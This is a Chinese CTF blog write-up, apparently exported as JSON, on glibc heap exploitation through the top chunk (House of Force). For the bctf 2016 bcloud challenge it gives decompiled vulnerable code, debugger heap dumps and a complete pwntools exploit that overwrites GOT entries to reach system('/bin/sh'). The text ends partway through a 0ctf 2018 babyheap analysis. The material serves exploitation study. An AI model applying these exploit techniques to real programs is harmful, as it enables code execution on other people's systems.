{"title":"Top Chunk利用","slug":"Top Chunk利用","date":"2019-04-21T02:58:07.000Z","updated":"2019-04-21T03:19:46.757Z","comments":true,"path":"api/articles/Top Chunk利用.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<p>本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。</p>\n<h2 id=\"House-of-force（Top-chunk劫持）\"><a href=\"#House-of-force（Top-chunk劫持）\" class=\"headerlink\" title=\"House of force（Top chunk劫持）\"></a>House of force（Top chunk劫持）</h2><h3 id=\"top-chunk的分割机制与利用点\"><a href=\"#top-chunk的分割机制与利用点\" class=\"headerlink\" title=\"top chunk的分割机制与利用点\"></a>top chunk的分割机制与利用点</h3><p>众所周知，top chunk的作用是作为后备堆空间，在各bin中没有chunk可提供时，分割出一个chunk提供给用户。那么这个分割过程是怎样的呢？我们来看一份源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim = av-&gt;top;</span><br><span class=\"line\">size   = chunksize(victim);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE)) <span class=\"comment\">//检查请求size是否可以分配</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    remainder_size = size - nb; <span class=\"comment\">// 分配后size，此处nb为有符号数</span></span><br><span class=\"line\">    remainder      = chunk_at_offset(victim, nb); <span class=\"comment\">// 分配后指针</span></span><br><span class=\"line\">    av-&gt;top        = remainder; <span class=\"comment\">// top = 分配后的指针</span></span><br><span class=\"line\">    set_head(victim, nb | PREV_INUSE | <span class=\"comment\">// 设置PREV_INUSE和NON_MAIN_ARENA</span></span><br><span class=\"line\">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>)); </span><br><span class=\"line\">    set_head(remainder, remainder_size | PREV_INUSE); <span class=\"comment\">//设置top</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk(av, victim, nb);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem(victim);</span><br><span class=\"line\">    alloc_perturb(p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了</p>\n<p>试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。</p>\n<p>一般来说，pwn中劫持控制流常常取malloc_hook, got表等指针，与堆空间中的top chunk相聚甚远，远到所需要申请的size必定超过top chunk现有的大小，无法控制if条件的检查。</p>\n<p>但是，我们看到if条件检查时size被强制转换为unsigned long，所以如果我们将size溢出覆盖为0xffffffff（-1），那么我们可以任意申请。此外，虽然此处的检查中，用户申请的大小也被当作无符号整数对待，但是在后面推top chunk的时候是以int对待的，所以可以劫持到低地址，加负数。</p>\n<h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>用户可以修改top chunk的size字段</li>\n<li>用户可以申请任意大小的堆内存（包括负数）</li>\n</ul>\n<h2 id=\"bctf-2016-bcloud\"><a href=\"#bctf-2016-bcloud\" class=\"headerlink\" title=\"bctf 2016 bcloud\"></a>bctf 2016 bcloud</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/heap/house-of-force/2016_bctf_bcloud$ checksec bcloud</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/heap/house-of-force/2016_bctf_bcloud/bcloud&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>没有开启PIE，RELRO也只开了一部分，所以可以劫持got表，同时注意是一道32位的题。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>main函数一开始在设置缓冲区之后，会调用init_bloud函数，首先要求输入名字，然后malloc(0x40)，将指针放在bss段上的name处，然后输出name中的数据。</p>\n<p>然后会调用init_org_host函数，输入org和host，都放在bss段上。</p>\n<h4 id=\"init-org-host\"><a href=\"#init-org-host\" class=\"headerlink\" title=\"init_org_host\"></a>init_org_host</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">init_org_host</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v2; <span class=\"comment\">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v3; <span class=\"comment\">// [esp+60h] [ebp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v4; <span class=\"comment\">// [esp+A4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [esp+ACh] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x90</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Org:\"</span>);</span><br><span class=\"line\">  read_str(&amp;s, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Host:\"</span>);</span><br><span class=\"line\">  read_str(&amp;v3, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr1</span></span><br><span class=\"line\">  v2 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr2</span></span><br><span class=\"line\">  org = v2;</span><br><span class=\"line\">  host = v4;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v4, &amp;v3);<span class=\"comment\">// 从v3地址起复制</span></span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v2, &amp;s); <span class=\"comment\">// 从s地址起复制到v2，越界。</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"OKay! Enjoy:)\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先向栈中s处开始写0x40，然后向v3处写0x40，如果都写满0x40个字节，在malloc v4和v2的时候，会把那一个\\x00覆盖掉，导致从栈中s处copy栈上数据一直到v3的填充结束。这里是典型的由于strcpy函数的不安全性导致的错误。</p>\n<h4 id=\"read-str\"><a href=\"#read-str\" class=\"headerlink\" title=\"read_str\"></a>read_str</h4><p>这里read_str函数中存在漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">read_str</span><span class=\"params\">(<span class=\"keyword\">char</span> *s, <span class=\"keyword\">int</span> len, <span class=\"keyword\">char</span> stop)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+1Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; len; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1u</span>) &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == stop )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    s[i] = buf;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  s[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当碰到\\n时会停止循环，如果读入完整长度，最后会多覆盖一个\\x00。</p>\n<h4 id=\"new-note\"><a href=\"#new-note\" class=\"headerlink\" title=\"new_note\"></a>new_note</h4><p>通过bss段上的notelist全局数组管理堆块，每次malloc输入的size+4，size存在notesize上，然后读入内容，最后把相应的issync数组项置为0。</p>\n<h4 id=\"show-note\"><a href=\"#show-note\" class=\"headerlink\" title=\"show_note\"></a>show_note</h4><p>假的，无法使用。</p>\n<h4 id=\"edit-note\"><a href=\"#edit-note\" class=\"headerlink\" title=\"edit_note\"></a>edit_note</h4><p>输入id，从notelist上取出相应chunk的指针，然后将对应id的issync置为0，最后根据存储的size进行edit</p>\n<h4 id=\"delete-note\"><a href=\"#delete-note\" class=\"headerlink\" title=\"delete_note\"></a>delete_note</h4><p>输入id，将notelist和notesize全部置为0，再free。</p>\n<h4 id=\"syn\"><a href=\"#syn\" class=\"headerlink\" title=\"syn\"></a>syn</h4><p>将issync前十位都置为1。</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"leak-heap\"><a href=\"#leak-heap\" class=\"headerlink\" title=\"leak heap\"></a>leak heap</h4><p>只要在输入name时输入0x40的数据即可泄漏出heap地址，因为堆块内存和堆块地址在栈上相邻。</p>\n<h4 id=\"修改top-chunk的size\"><a href=\"#修改top-chunk的size\" class=\"headerlink\" title=\"修改top chunk的size\"></a>修改top chunk的size</h4><p>调试得到top chunk的size会被org的前4个byte覆盖。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x8178008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x8178050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178050     63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63    cccccccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x8178098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x81780e0, size=0x63636360, flags=PREV_INUSE|IS_MMAPPED)  ←  top chunk</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  x/64x 0x08178050</span><br><span class=\"line\">0x8178050:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178060:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178070:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178080:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178090:\t0x00000000\t0x00000049\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780a0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780b0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780c0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780d0:\t0x62626262\t0x62626262\t0x08178098\t0x63636363</span><br><span class=\"line\">0x81780e0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x81780f0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178100:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178110:\t0x63636363\t0x63636363\t0x63636363\t0x00000000</span><br><span class=\"line\">0x8178120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.sendline(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"c\"</span> * <span class=\"number\">0x3c</span>)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x877b008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x877b050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b050     ff ff ff ff 63 63 63 63 63 63 63 63 63 63 63 63    ....cccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x877b098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x877b0e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以就可以实现任意写了</p>\n<h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>由于程序中没有leak的功能，我们要实现leak libc，需要劫持某个got表为最一开始打印用户名的函数，而且这个libc函数的参数还需要我们能控制，所以我们只能选择free函数。</p>\n<p>因为程序是通过notelist管理chunk，所以只要我们劫持了notelist，也就可以实现任意地址读写。</p>\n<p>所以我们将chunk分配到notelist之前，然后依次修改notelist上前几项为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts@got # 0</span><br><span class=\"line\">free@got # 1</span><br><span class=\"line\">&amp;notelist[3] # 2</span><br><span class=\"line\">/bin # 3</span><br><span class=\"line\">/sh\\x00 4</span><br></pre></td></tr></table></figure>\n<p>首先edit(1)，劫持free@got为info函数，然后delete(0)，即可leak出libc。</p>\n<h4 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h4><p>然后edit(1)，劫持free@got为system，最后delte(2)即可getshell。</p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"the content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate__</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">info = <span class=\"number\">0x8048779</span></span><br><span class=\"line\">notelist = <span class=\"number\">0x804b120</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">heap_addr = u32(p.recvuntil(<span class=\"string\">\"!\"</span>)[<span class=\"number\">-5</span>:<span class=\"number\">-1</span>]) - <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change top chunk</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.send(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># malloc to notelist</span></span><br><span class=\"line\">offset = (notelist - <span class=\"number\">0x8</span>) - (heap_addr + <span class=\"number\">0xd8</span>) - <span class=\"number\">0x8</span></span><br><span class=\"line\">allocate__(offset) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(elf.got[<span class=\"string\">'puts'</span>]) <span class=\"comment\">#0</span></span><br><span class=\"line\">payload += p32(elf.got[<span class=\"string\">'free'</span>]) <span class=\"comment\"># 1</span></span><br><span class=\"line\">payload += p32(notelist + <span class=\"number\">0x4</span> * <span class=\"number\">3</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># 3 4</span></span><br><span class=\"line\">allocate(len(payload), payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(info) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">puts_got = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = puts_got - libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(system) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0ctf-2018-babyheap\"><a href=\"#0ctf-2018-babyheap\" class=\"headerlink\" title=\"0ctf 2018 babyheap\"></a>0ctf 2018 babyheap</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/baby-heap-2018$ checksec babyheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/baby-heap-2018/babyheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>全防护</p>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><h4 id=\"allocate\"><a href=\"#allocate\" class=\"headerlink\" title=\"allocate\"></a>allocate</h4><p>​    最多16个chunk，size不大于0x58，每次calloc之后将list数组上对应位置的inuse置1，并存储size和chunkptr，但是并没有写入chunk的内容。</p>\n<h4 id=\"update\"><a href=\"#update\" class=\"headerlink\" title=\"update\"></a>update</h4><p>​    输入Index和一个size，然后如果输入的size小于等于原来的size+1，就可以以输入的size向堆上写，也就是这里存在off by one漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">fastcall <span class=\"title\">update</span><span 